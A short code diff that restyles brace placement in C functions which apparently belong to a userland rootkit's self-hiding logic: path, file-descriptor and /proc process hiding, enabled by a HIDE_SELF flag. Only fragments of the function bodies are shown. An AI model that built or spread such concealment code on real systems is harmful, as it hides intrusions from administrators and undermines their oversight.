@@ -1,5 +1,4 @@
-int _hidden_path(const char *pathname, int mode)
-{
+int _hidden_path(const char *pathname, int mode){
 #ifndef HIDE_SELF
     return 0;
 #endif
@@ -9,8 +8,7 @@ int _hidden_path(const char *pathname, int mode)
     return 0;
 }
 
-int _f_hidden_path(int fd, int mode)
-{
+int _f_hidden_path(int fd, int mode){
 #ifndef HIDE_SELF
     return 0;
 #endif
@@ -20,8 +18,7 @@ int _f_hidden_path(int fd, int mode)
     return 0;
 }
 
-int _l_hidden_path(const char *pathname, int mode)
-{
+int _l_hidden_path(const char *pathname, int mode){
 #ifndef HIDE_SELF
     return 0;
 #endif
@@ -31,13 +28,12 @@ int _l_hidden_path(const char *pathname, int mode)
     return 0;
 }
 
-int hidden_proc(pid_t pid)
-{
+int hidden_proc(pid_t pid){
 #ifndef HIDE_SELF
     return 0;
 #endif
 
     char proc_path[PATH_MAX];
-    (void)snprintf(proc_path, sizeof(proc_path) - 1, "/proc/%d", pid);
+    snprintf(proc_path, sizeof(proc_path) - 1, "/proc/%d", pid);
     return _hidden_path(proc_path, 32);
 }
